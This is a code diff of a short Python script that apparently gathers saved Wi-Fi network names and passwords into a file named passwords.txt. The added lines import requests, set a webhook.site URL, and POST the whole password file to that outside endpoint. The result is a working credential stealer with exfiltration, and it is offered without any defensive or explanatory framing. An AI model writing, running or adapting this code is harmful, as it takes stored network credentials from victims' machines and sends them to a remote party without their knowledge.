@@ -1,6 +1,9 @@
 import subprocess
 import os
 import sys
+import requests
+
+url = 'https://webhook.site/df2d35f2-acdf-47c9-8739-383b7d97e740'
 
 password_file = open('passwords.txt', "w")
 password_file.write("Hello sir! Here are your passwords:\n\n")
@@ -35,6 +38,9 @@ for filename in os.listdir(path):
                             sys.stdout = open("passwords.txt", "a")
                             print("SSID: "+x, "Password: "+y, sep='\n')
                             sys.stdout.close()
+                           
+with open('passwords.txt', 'rb') as f:
+    r =requests.post(url, data=f)
 
 
 
